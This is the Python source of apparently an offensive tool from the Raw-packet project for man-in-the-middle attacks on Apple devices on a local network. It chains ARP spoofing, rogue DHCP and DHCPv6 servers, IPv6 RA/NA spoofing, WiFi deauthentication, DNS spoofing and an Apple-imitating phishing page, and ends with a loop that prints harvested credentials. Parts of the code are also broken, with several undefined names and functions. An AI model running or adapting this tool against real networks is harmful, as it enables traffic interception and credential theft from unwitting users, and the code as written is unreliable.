#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
apple_mitm.py: MiTM Apple devices (apple_mitm)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.tm import ThreadManager
from raw_packet.Utils.network import RawSniff

from raw_packet.Scanners.scanner import Scanner
from raw_packet.Scanners.arp_scanner import ArpScan
from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan

from raw_packet.Servers.dns_server import DnsServer
from raw_packet.Servers.dhcpv4_server import DHCPv4Server
from raw_packet.Servers.dhcpv6_server import DHCPv6Server
from raw_packet.Servers.Phishing.phishing import PhishingServer

from raw_packet.Scripts.NCC.ncc import NetworkConflictCreator
from raw_packet.Scripts.Apple.apple_dhcp_server import AppleDHCPServer
from raw_packet.Scripts.ARP.arp_spoof import ArpSpoof
from raw_packet.Scripts.IPv6.ipv6_spoof import IPv6Spoof

from prettytable import PrettyTable
from argparse import ArgumentParser, RawTextHelpFormatter
from time import sleep
from ipaddress import IPv4Address
from random import randint
from typing import Union, List, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion


class AppleMitm:

    deauth_stop: bool = False

    # region Disconnect device
    def disconnect_device(self,
                          network_interface: str = 'eth0',
                          ip_address: str = '192.168.0.1',
                          mac_address: str = '12:34:56:78:90:ab',
                          use_deauth_technique: bool = False,
                          deauth_interface: Union[None, str] = None,
                          deauth_packets: int = 5,
                          network_channel: Union[None, str] = None,
                          network_bssid: Union[None, str] = None):

        if not use_deauth_technique:
            # Start Network Conflict Creator (ncc)
            ncc: NetworkConflictCreator = NetworkConflictCreator(network_interface=network_interface)
            ncc.start(target_mac_address=mac_address,
                      target_ip_address=ip_address,
                      exit_on_success=True)

        else:
            # Start WiFi deauth packets sender
            self.deauth_packets_send(deauth_interface, network_channel, network_bssid, mac_address, deauth_packets)
    # endregion

    # region ARP spoofing
    @staticmethod
    def make_arp_spoof(network_interface: str = 'eth0',
                       mac_address: str = '12:34:56:78:90:ab',
                       ip_address: str = '129.168.0.1',
                       gateway_ip_address: str = '129.168.0.254'):
        # Wait 3 seconds
        sleep(3)
        # Start ARP Spoofing (arp_spoof)
        arp_spoof: ArpSpoof = ArpSpoof(network_interface=network_interface)
        arp_spoof.start(gateway_ipv4_address=gateway_ip_address,
                        target_ipv4_address=ip_address,
                        target_mac_address=mac_address,
                        quit=True)
    # endregion

    # region NA spoofing
    @staticmethod
    def make_na_spoof(network_interface: str = 'eth0',
                      mac_address: str = '12:34:56:78:90:ab',
                      ipv6_address: str = 'fe80::123',
                      gateway_ipv6_address: str = 'fe80::1',
                      dns_ipv6_address: Union[None, str] = None):
        # Wait 3 seconds
        sleep(3)
        # Start Neighbor Advertise spoofing script
        ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=network_interface)
        ipv6_spoof.start(technique=2,
                         target_ipv6_address=ipv6_address,
                         target_mac_address=mac_address,
                         gateway_ipv6_address=gateway_ipv6_address,
                         dns_ipv6_address=dns_ipv6_address,
                         quit=True)
    # endregion

    # region RA spoofing
    @staticmethod
    def make_ra_spoof(network_interface: str = 'eth0',
                      mac_address: str = '12:34:56:78:90:ab',
                      ipv6_address: str = 'fe80::123',
                      gateway_ipv6_address: str = 'fe80::1'):
        # Wait 3 seconds
        sleep(3)
        # Start Router Advertise spoofing script
        ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=network_interface)
        ipv6_spoof.start(technique=1,
                         target_ipv6_address=ipv6_address,
                         target_mac_address=mac_address,
                         gateway_ipv6_address=gateway_ipv6_address,
                         quit=True)
    # endregion

    # region Rogue DHCP server
    @staticmethod
    def rogue_dhcpv4_server(network_interface: str = 'eth0',
                            target_mac_address: str = '12:34:56:78:90:ab',
                            target_ipv4_address: str = '129.168.0.1'):
        # Wait 3 seconds
        sleep(3)
        # Start DHCP rogue server
        dhcpv4_server: DHCPv4Server = DHCPv4Server(network_interface=network_interface)
        dhcpv4_server.start(target_mac_address=target_mac_address,
                            target_ipv4_address=target_ipv4_address,
                            apple=True, quit=True,
                            exit_on_success=True)
    # endregion

    # region Rogue DHCP server for Apple devices
    @staticmethod
    def rogue_apple_dhcpv4_server(network_interface: str = 'eth0',
                                  target_mac_address: str = '12:34:56:78:90:ab',
                                  new_ip_address: str = '129.168.0.111'):
        # Wait 3 seconds
        sleep(3)
        # Start DHCP rogue server with predict next transaction ID
        apple_dhcp_server: AppleDHCPServer = AppleDHCPServer(network_interface=network_interface)
        apple_dhcp_server.start(target_ip_address=new_ip_address,
                                target_mac_address=target_mac_address,
                                quit=True)
    # endregion

    # region Rogue DHCPv6 server
    @staticmethod
    def rogue_dhcpv6_server(network_interface: str = 'eth0',
                            ipv6_prefix: str = 'fd00::/64',
                            target_mac_address: str = '12:34:56:78:90:ab',
                            global_ipv6_address: str = 'fd00::123'):
        # Wait 3 seconds
        sleep(3)
        # Start DHCPv6 rogue server
        dhcpv6_server: DHCPv6Server = DHCPv6Server(network_interface=network_interface)
        dhcpv6_server.start(target_mac_address=target_mac_address,
                            target_ipv6_address=global_ipv6_address,
                            ipv6_prefix=ipv6_prefix,
                            exit_on_success=True,
                            quit=True)
    # endregion

    # region Start DNS server
    def start_dns_server(self,
                         network_interface: str = 'eth0',
                         target_mac_address: str = '12:34:56:78:90:ab',
                         technique_index: int = 1,
                         fake_ipv4_address: str = '129.168.0.2',
                         mitm_success_domain: str = 'test.com'):
        dns_server: DnsServer = DnsServer(network_interface=network_interface)
        if technique_index in [1, 2, 3]:
            dns_server.start(target_mac_address=target_mac_address,
                             fake_answers=True,
                             fake_ipv4_addresses=[fake_ipv4_address],
                             success_domains=['captive.apple.com', mitm_success_domain])
        if technique_index in [4, 5, 6]:
            dns_server.start(target_mac_address=target_mac_address,
                             fake_answers=True,
                             fake_ipv4_addresses=[fake_ipv4_address],
                             listen_ipv6=True,
                             success_domains=['captive.apple.com', mitm_success_domain])
    # endregion

    # region Start Phishing server
    @staticmethod
    def start_phishing_server(address: str = '0.0.0.0',
                              port: int = 80,
                              site='apple'):
        phishing_server: PhishingServer = PhishingServer()
        phishing_server.start(address=address,
                              port=port,
                              site=site,
                              quiet=False)
    # endregion

    # region Requests sniffer PRN function
    def requests_sniffer_prn(self, request: Dict):
        if 'DHCPv4' in request.keys() or 'ICMPv6' in request.keys():
            self.deauth_stop = True
    # endregion

    # region Requests sniffer function
    def requests_sniffer(self, source_mac_address: str = '12:34:56:78:90:ab'):

        # region Set network filter
        network_filters = {'Ethernet': {'source': source_mac_address}}

        if technique_index == 2:
            network_filters = {
                'Ethernet': {
                    'source': source_mac_address,
                    'destination': 'ff:ff:ff:ff:ff:ff'
                },
                'IPv4': {
                    'source-ip': '0.0.0.0',
                    'destination-ip': '255.255.255.255'
                },
                'UDP': {
                    'source-port': 68,
                    'destination-port': 67
                }
            }
        # endregion

        # region Start sniffer
        sniff = RawSniff()
        sniff.start(protocols=['ARP', 'IPv4', 'IPv6', 'ICMPv6', 'UDP', 'DHCPv4'],
                    prn=self.requests_sniffer_prn, filters=network_filters)
        # endregion

    # endregion

    # region WiFi deauth packets sender
    def deauth_packets_send(self,
                            network_interface: str = 'wlan1',
                            network_channel: str = '1',
                            network_bssid: str = '12:34:56:78:90:ab',
                            mac_address: str = '12:34:56:78:90:ac',
                            number_of_deauth: int = 5):
        pass
        # global aireply_stop
        #
        # # Start target requests sniffer function
        # threat_manager = ThreadManager(2)
        # threat_manager.add_task(requests_sniffer, mac_address)
        #
        # # Set WiFi channel on interface for send WiFi deauth packets
        # sub.Popen(['iwconfig ' + network_interface + ' channel ' + network_channel], shell=True)
        #
        # # Start deauth packets numbers
        # deauth_packets_number = number_of_deauth
        # aireply_stop = False
        #
        # while deauth_packets_number < 50:
        #
        #     # Check global variable aireplay_stop
        #     if aireply_stop:
        #         base.print_info('Stop aireplay-ng ...')
        #         break
        #
        #     # Start aireplay-ng process
        #     try:
        #         base.print_info('Send WiFi deauth packets in aireplay-ng ...')
        #         aireplay_process = sub.Popen(['aireplay-ng ' + network_interface +
        #                                       ' -0 ' + str(deauth_packets_number) +
        #                                       ' -a ' + network_bssid +
        #                                       ' -c ' + mac_address], shell=True, stdout=sub.PIPE)
        #         while True:
        #             output = aireplay_process.stdout.readline().decode()
        #             if output == '' and aireplay_process.poll() is not None:
        #                 break
        #             if output:
        #                 stdout.write(re.sub(r'(\d\d:\d\d:\d\d  (Waiting|Sending))', base.c_info + r'\g<1>', output))
        #
        #     except OSError:
        #         base.print_error('Something else went wrong while trying to run ', '`aireply-ng`')
        #         exit(2)
        #
        #     # Wait before sniff request packet from target
        #     base.print_info('Wait 10 sec. before sniff packets from target: ' + mac_address)
        #     sleep(10)
        #
        #     # Add 5 packets to number of WiFi deauth packets
        #     deauth_packets_number += 5
    # endregion


# region Main function
def main():

    # region Init Raw-packet classes
    base: Base = Base()
    scanner: Scanner = Scanner()
    arp_scan: ArpScan = ArpScan()
    icmpv6_scan: ICMPv6Scan = ICMPv6Scan()
    thread_manager: ThreadManager = ThreadManager(5)
    # endregion

    # region Check user, platform and print banner
    base.check_user()
    base.check_platform()
    base.print_banner()
    # endregion

    # region Variables
    target_mac_address: Union[None, str] = None
    target_ip_address: Union[None, str] = None
    new_target_ip_address: Union[None, str] = None
    target_apple_device: Union[None, List[str]] = None

    first_suffix: int = 2
    last_suffix: int = 255

    network_prefix: Union[None, str] = None
    network_prefix_address: Union[None, str] = None
    network_prefix_length: Union[None, str] = None

    deauth: bool = False
    deauth_network_interface: Union[None, str] = None
    disconnect: bool = False

    gateway_ipv6_address: Union[None, str] = None
    dns_ipv6_address: Union[None, str] = None
    real_prefix: Union[None, str] = None
    mtu: int = 1500
    # endregion

    try:
        # region Parse script arguments
        parser = ArgumentParser(description='MiTM Apple devices in local network',
                                formatter_class=RawTextHelpFormatter)
        parser.add_argument('-T', '--technique', type=str, default=None,
                            help='Set MiTM technique:'
                                 '\n1. ARP Spoofing'
                                 '\n2. Second DHCP ACK'
                                 '\n3. Predict next DHCP transaction ID'
                                 '\n4. Rogue SLAAC/DHCPv6 server'
                                 '\n5. NA Spoofing (IPv6)'
                                 '\n6. RA Spoofing (IPv6)')
        parser.add_argument('-D', '--disconnect', type=str, default=None,
                            help='Set device Disconnect technique:'
                                 '\n1. IPv4 network conflict detection'
                                 '\n2. Send WiFi deauthentication packets'
                                 '\n3. Do not disconnect device after MiTM')
        parser.add_argument('-l', '--listen_iface', type=str, help='Set interface name for listen packets')
        parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
        parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 5)',
                            default=5)
        parser.add_argument('-f', '--phishing_domain', type=str, default='auth.apple.wi-fi.com',
                            help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
        parser.add_argument('-p', '--phishing_domain_path', type=str, default='apple',
                            help='Set local path to for social engineering site \n' +
                                 'in directory: raw_packet/Utils/Phishing_domains \n' +
                                 'or use your own directory (default="apple")')
        parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
        parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
        parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')

        parser.add_argument('--kill', action='store_true', help='Kill all processes and threads')
        parser.add_argument('--ipv6_prefix', type=str, help='Set IPv6 network prefix, default - fd00::/64',
                            default='fd00::/64')

        args = parser.parse_args()
        # endregion

        # region MiTM technique selection
        techniques: Dict[int, str] = {
            1: 'ARP Spoofing',
            2: 'Second DHCP ACK',
            3: 'Predict next DHCP transaction ID',
            4: 'Rogue SLAAC/DHCPv6 server',
            5: 'NA Spoofing (IPv6)',
            6: 'RA Spoofing (IPv6)'
        }

        if args.technique is None:
            base.print_info('MiTM technique list:')
            technique_pretty_table = PrettyTable([base.cINFO + 'Index' + base.cEND,
                                                  base.cINFO + 'MiTM technique' + base.cEND])
            for technique_key in techniques.keys():
                technique_pretty_table.add_row([str(technique_key), techniques[technique_key]])

            print(technique_pretty_table)
            current_technique_index = input(base.c_info + 'Set MiTM technique index from range (1 - ' +
                                            str(len(techniques.keys())) + '): ')

        else:
            current_technique_index = args.technique

        assert current_technique_index.isdigit(), \
            'MiTM technique index is not digit!'

        assert not any([int(current_technique_index) < 1, int(current_technique_index) > len(techniques.keys())]), \
            'MiTM technique index is not within range (1 - ' + str(len(techniques.keys())) + ')'

        technique_index = int(current_technique_index)
        # endregion

        # region Disconnect device technique selection
        disconnect_techniques: Dict[int, str] = {
            1: 'IPv4 network conflict detection',
            2: 'Send WiFi deauthentication packets',
            3: 'Do not disconnect device after MiTM'
        }

        if args.disconnect is None:
            base.print_info('Disconnect technique list:')
            disconnect_pretty_table = PrettyTable([base.cINFO + 'Index' + base.cEND,
                                                  base.cINFO + 'Disconnect technique' + base.cEND])
            for technique_key in disconnect_techniques.keys():
                disconnect_pretty_table.add_row([str(technique_key), disconnect_techniques[technique_key]])

            print(disconnect_pretty_table)
            current_technique_index = input(base.c_info + 'Set Disconnect technique index from range (1 - ' +
                                            str(len(disconnect_techniques.keys())) + '): ')

        else:
            current_technique_index = args.disconnect

        assert current_technique_index.isdigit(), \
            'Disconnect technique index is not digit!'

        assert not any([int(current_technique_index) < 1,
                        int(current_technique_index) > len(disconnect_techniques.keys())]), \
            'Disconnect technique index is not within range (1 - ' + str(len(disconnect_techniques.keys())) + ')'

        disconnect_technique_index = int(current_technique_index)

        # Do not disconnect device after MiTM
        if disconnect_technique_index == 3:
            disconnect = False

        # Use disconnect technique
        else:
            disconnect = True

            # Use IPv4 network conflict detection
            if disconnect_technique_index == 1:

                if technique_index in [1, 3]:
                    deauth = False

                else:
                    base.print_error('You chose MiTM technique: ', techniques[technique_index],
                                     ' but this technique works only with WiFi deauthentication disconnect')
                    base.print_info('Change disconnect technique to: ', disconnect_techniques[2])
                    deauth = True

            # Use WiFi deauthentication
            if disconnect_technique_index == 2:
                deauth = True

        # endregion

        # region Get listen network interface, your IP address, first and last IP in local network
        if args.listen_iface is None:
            base.print_warning('Please set a network interface for sniffing target requests ...')
        listen_network_interface: str = base.network_interface_selection(args.listen_iface)
        your_mac_address: str = base.get_interface_mac_address(listen_network_interface)
        your_ip_address: str = base.get_interface_ip_address(listen_network_interface)

        your_local_ipv6_address: Union[None, str] = None
        if technique_index in [4, 5, 6]:
            your_local_ipv6_address = base.get_interface_ipv6_link_address(listen_network_interface)
            network_prefix = args.ipv6_prefix
            network_prefix_address = network_prefix.split('/')[0]
            network_prefix_length = network_prefix.split('/')[1]

        first_ip_address: str = base.get_first_ip_on_interface(listen_network_interface)
        last_ip_address: str = base.get_last_ip_on_interface(listen_network_interface)
        # endregion

        # region Get network interface for send wifi deauth packets, get wifi settings from listen network interface
        essid: Union[None, str] = None
        bssid: Union[None, str] = None
        channel: Union[None, str] = None
        freq: Union[None, str] = None

        if args.deauth_iface is not None:
            deauth = True

        if technique_index == 2:
            deauth = True

        if deauth:
            # region Get network interface for send wifi deauth packets
            if args.deauth_iface is None:
                base.print_warning('Please set network interface for send WiFi deauth packets ...')
            deauth_network_interface = base.network_interface_selection(args.deauth_iface)

            assert listen_network_interface != deauth_network_interface, \
                'Network interface for listening target requests: ' + base.info_text(listen_network_interface) +  \
                ' and network interface for send WiFi deauth packets: ' + base.info_text(deauth_network_interface) + \
                ' must be differ!'
            # endregion

            # region Get wifi settings from listen network interface
            try:
                iwgetid = sub.run(['iwgetid -r ' + listen_network_interface], shell=True, stdout=sub.PIPE)
                essid = iwgetid.stdout.decode('utf-8').rstrip()
                iwgetid = sub.run(['iwgetid -a -r ' + listen_network_interface], shell=True, stdout=sub.PIPE)
                bssid = iwgetid.stdout.decode('utf-8').rstrip()
                iwgetid = sub.run(['iwgetid -c -r ' + listen_network_interface], shell=True, stdout=sub.PIPE)
                channel = iwgetid.stdout.decode('utf-8').rstrip()
                iwgetid = sub.run(['iwgetid -f -r ' + listen_network_interface], shell=True, stdout=sub.PIPE)
                freq = iwgetid.stdout.decode('utf-8').rstrip()
                assert not (essid is None or essid == ''), \
                    'Network interface: ' + base.error_text(listen_network_interface) + ' is not connected to WiFi AP!'
            except OSError as e:
                base.print_error('Something else went wrong while trying to run `iwgetid`')
                exit(2)
            # endregion

        # endregion

        # region Set monitor mode on network interface for send wifi deauth packets
        if deauth:
            base.print_info('Set Monitor mode on interface: ', deauth_network_interface, ' ...')
            try:
                sub.run(['ifconfig ' + deauth_network_interface + ' down'], shell=True, stdout=sub.PIPE)
                sub.run(['iwconfig ' + deauth_network_interface + ' mode monitor >/dev/null 2>&1'],
                        shell=True, stdout=sub.PIPE)
                wireless_settings = sub.run(['iwconfig ' + deauth_network_interface], shell=True,
                                            stdout=sub.PIPE, stderr=sub.PIPE)
                wireless_settings_out: str = wireless_settings.stdout.decode('utf-8').rstrip()
                wireless_settings_err: str = wireless_settings.stderr.decode('utf-8').rstrip()
                assert 'no wireless extensions' not in wireless_settings_err, \
                    'Network interface: ' + base.error_text(deauth_network_interface) + ' is wired!'
                assert wireless_settings_out.find('Mode:Monitor') != -1, \
                    'Could not set Monitor mode on interface: ' + base.error_text(deauth_network_interface)
                sub.run(['ifconfig ' + deauth_network_interface + ' up'], shell=True, stdout=sub.PIPE)
            except OSError as e:
                base.print_error('Something else went wrong while trying to run `iwconfig` or `ifconfig`')
                exit(2)
        # endregion

        # region Check target IP and new IP addresses
        if args.target_ip is not None:
            assert base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address), \
                'Bad value `-t, --target_ip`: ' + base.error_text(args.target_ip) + \
                '; Target IP address must be in range: ' + \
                base.info_text(first_ip_address + ' - ' + last_ip_address)
            target_ip_address = args.target_ip

        if args.new_ip is not None:
            assert base.ip_address_in_range(args.new_ip, first_ip_address, last_ip_address), \
                'Bad value `-n, --new_ip`: ' + base.error_text(args.new_ip) + \
                '; New IP address for target must be in range: ' + \
                base.info_text(first_ip_address + ' - ' + last_ip_address)
            new_target_ip_address = args.new_ip
        # endregion

        # region Kill subprocess

        # Kill subprocess
        kill_processes()

        try:
            base.print_info('Stop services: ', 'dnsmasq, network-manager')
            sub.run(['service dnsmasq stop  >/dev/null 2>&1'], shell=True)
            sub.run(['service network-manager stop  >/dev/null 2>&1'], shell=True)
        except OSError as e:
            base.print_error('Something went wrong while trying to run ', '`service ...`')
            exit(2)

        # Kill the processes that listens on 53, 68, 547 UDP port, 80 and 443 TCP ports
        base.print_info('Stop processes that listens on UDP ports: ', '53, 68, 547')
        base.kill_processes_by_listen_port(53, 'udp')
        base.kill_processes_by_listen_port(68, 'udp')
        base.kill_processes_by_listen_port(547, 'udp')

        base.print_info('Stop processes that listens on TCP ports: ', '80, 443')
        base.kill_processes_by_listen_port(80, 'tcp')
        base.kill_processes_by_listen_port(443, 'tcp')

        # Exit
        if args.kill:
            exit(0)

        # endregion

        # region General output
        base.print_info('You chose MiTM technique: ', techniques[technique_index])
        base.print_info('Listen network interface: ', listen_network_interface)

        if technique_index in [1, 2, 3]:
            base.print_info('Your IP address: ', your_ip_address)
            base.print_info('First ip address: ', first_ip_address)
            base.print_info('Last ip address: ', last_ip_address)

            if target_ip_address is not None:
                base.print_info('Target IP address: ', target_ip_address)

            if new_target_ip_address is not None:
                base.print_info('Target new IP address: ', new_target_ip_address)

        else:
            base.print_info('Your IPv6 local address: ', your_local_ipv6_address)
            base.print_info('Prefix: ', network_prefix)
            base.print_info('Router IPv6 address: ', your_local_ipv6_address)
            base.print_info('DNS IPv6 address: ', your_local_ipv6_address)
            base.print_info('First advertise IPv6 address: ', network_prefix_address + hex(first_suffix))
            base.print_info('Last advertise IPv6 address: ', network_prefix_address + hex(last_suffix))

        if deauth:
            base.print_info('Interface ', listen_network_interface, ' connect to: ', essid + ' (' + bssid + ')')
            base.print_info('Interface ', listen_network_interface, ' channel: ', channel)
            base.print_info('Interface ', listen_network_interface, ' frequency: ', freq)
            base.print_info('Deauth network interface: ', deauth_network_interface)
        # endregion

        # region Scan IPv4 local network
        if technique_index in [1, 2, 3]:

            # region Find Apple devices in local network with arp_scan or nmap
            if args.target_ip is None:
                if not args.nmap_scan:
                    base.print_info('ARP scan is running ...')
                    apple_devices = scanner.find_apple_devices_by_mac(listen_network_interface)
                else:
                    base.print_info('NMAP scan is running ...')
                    apple_devices = scanner.find_apple_devices_with_nmap(listen_network_interface)
                target_apple_device = scanner.apple_device_selection(apple_devices)
            # endregion

            # region Find Mac address of Apple device if target IP is set
            if args.target_ip is not None:
                base.print_info('Search MAC address of Apple device with IP address: ', target_ip_address, ' ...')
                target_mac_address = arp_scan.get_mac_address(listen_network_interface, target_ip_address)
                target_apple_device = [target_ip_address, target_mac_address]
            # endregion

        # endregion

        # region Scan IPv6 local network
        if technique_index in [4, 5, 6]:

            # region Find Apple devices in local network with ICMPv6 scan
            base.print_info('ICMPv6 scan is running ...')
            apple_devices = scanner.find_apple_devices_by_mac_ipv6(listen_network_interface)
            target_apple_device = scanner.apple_device_selection(apple_devices)
            # endregion

        # endregion

        # region Check variable target_apple_device
        # target_apple_device = ['192.168.119.123', '12:34:56:78:90:ab'] # DEBUG

        if target_apple_device is not None:
            if len(target_apple_device) == 3 or len(target_apple_device) == 2:
                target_ip_address = target_apple_device[0]
                target_mac_address = target_apple_device[1]
            else:
                base.print_error('Bad value in target Apple device!')
                exit(1)
        else:
            base.print_error('Target Apple device not found!')
            exit(1)
        # endregion

        # region Run DNS server
        base.print_info('Start DNS server ...')
        thread_manager.add_task(start_dns_server, listen_network_interface, target_mac_address,
                                technique_index, your_ip_address, se_domain)
        # endregion

        # region Get network interface gateway IPv6 address
        if technique_index in [5, 6]:
            base.print_info('Search IPv6 Gateway and DNS server ...')
            router_advertisement_data = icmpv6_scan.search_router(listen_network_interface, 5, 3)

            if router_advertisement_data is not None:
                gateway_ipv6_address = router_advertisement_data['router_ipv6_address']

                if 'dns-server' in router_advertisement_data.keys():
                    dns_ipv6_address = router_advertisement_data['dns-server']

                if 'prefix' in router_advertisement_data.keys():
                    real_prefix = router_advertisement_data['prefix']
                else:
                    real_prefix = network_prefix

                if 'mtu' in router_advertisement_data.keys():
                    mtu = int(router_advertisement_data['mtu'])
            else:
                base.print_error('Can not find IPv6 gateway in local network on interface: ', listen_network_interface)
                exit(1)
        # endregion

        # region 1. ARP spoofing technique
        if technique_index == 1:

            # region Get network interface gateway IP address
            gateway_ip_address = base.get_interface_gateway(listen_network_interface)

            if gateway_ip_address is None:
                base.print_error('Could not found gateway on interface: ', listen_network_interface)
                gateway_ip_address_input = input(base.c_info + 'Set gateway IP address: ')
                assert base.ip_address_in_range(gateway_ip_address_input, first_ip_address, last_ip_address), \
                    'Gateway IP address: ' + base.error_text(gateway_ip_address_input) + \
                    ' not in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
                gateway_ip_address = gateway_ip_address_input
            # endregion

            # region Start ARP spoof
            make_arp_spoof(listen_network_interface, target_mac_address, target_ip_address, gateway_ip_address)
            # endregion

        # endregion

        # region 2. Second DHCP ACK technique
        if technique_index == 2:

            # region Start Rogue DHCP server
            rogue_dhcp_server(listen_network_interface, target_mac_address, target_ip_address)
            # endregion

        # endregion

        # region 3. Predict next DHCP transaction ID
        if technique_index == 3:

            # region Find free IP in local network
            if new_target_ip_address is None:

                # region Fast scan localnet with arp_scan
                base.print_info('Search for free IP addresses on the local network ...')
                localnet_ip_addresses = scanner.find_ip_in_local_network(listen_network_interface)
                # endregion

                index = 0
                while new_target_ip_address is None:
                    check_ip = str(IPv4Address(first_ip_address) + index)
                    if check_ip != your_ip_address:
                        if check_ip not in localnet_ip_addresses:
                            new_target_ip_address = check_ip
                        else:
                            index += 1
                    else:
                        index += 1

            base.print_info('Find new IP address: ', new_target_ip_address, ' for target')
            # endregion

            # region Start Rogue DHCP server with predict next transaction ID
            rogue_dhcp_server_predict_trid(listen_network_interface, target_mac_address, new_target_ip_address)
            # endregion

        # endregion

        # region 4. Rogue SLAAC/DHCPv6 server
        if technique_index == 4:

            # region Start Rogue DHCPv6 server
            target_global_ipv6_address = network_prefix_address + str(randint(first_suffix, last_suffix))
            base.print_info('New global IPv6 address: ', target_global_ipv6_address,
                            ' for target: ', target_ip_address + ' (' + target_mac_address + ')')
            rogue_dhcpv6_server(listen_network_interface, network_prefix, target_mac_address, target_global_ipv6_address)
            # endregion

        # endregion

        # region 5. NA Spoofing (IPv6)
        if technique_index == 5:

            # region Start Neighbor Advertise spoof
            make_na_spoof(listen_network_interface, target_mac_address, target_ip_address, gateway_ipv6_address,
                          dns_ipv6_address)
            # endregion

        # endregion

        # region 6. RA Spoofing (IPv6)
        if technique_index == 6:

            # region Start Neighbor Advertise spoof
            make_ra_spoof(listen_network_interface, target_mac_address, target_ip_address, gateway_ipv6_address)
            # endregion

        # endregion

        # region Disconnect device
        if disconnect:
            disconnect_device(listen_network_interface, target_ip_address, target_mac_address, deauth,
                              deauth_network_interface, args.deauth_packets, channel, bssid)
        # endregion

        # region Check credentials

        # Get credentials file size
        credentials_file_size = stat(credentials_file_name).st_size

        while True:
            # Credentials file has changed
            if stat(credentials_file_name).st_size > credentials_file_size:

                # Read credentials file
                credentials_file_descriptor = open(credentials_file_name, 'r')
                credentials_file_descriptor.seek(credentials_file_size)
                try:
                    for credentials in credentials_file_descriptor.readlines():
                        credentials_list = credentials.split(' ')
                        base.print_success('Phishing success: ', credentials_list[0],
                                           ' credentials: ', credentials_list[1], ' ', credentials_list[2][:-1])
                except IndexError:
                    pass
                credentials_file_descriptor.close()

                # Rewrite credentials file size
                credentials_file_size = stat(credentials_file_name).st_size

            # Wait
            sleep(1)

        # endregion

    except KeyboardInterrupt:

        # Kill subprocess
        kill_processes(True)

        # Print info message
        base.print_info('Exit ...')

        # Exit from Main function
        exit(0)

    except AssertionError as Error:

        # Kill subprocess
        kill_processes(True)

        # Print error text
        base.print_error(Error.args[0])

        # Exit with error
        exit(1)

    # endregion

# endregion


# region Call Main function
if __name__ == '__main__':
    main()
# endregion
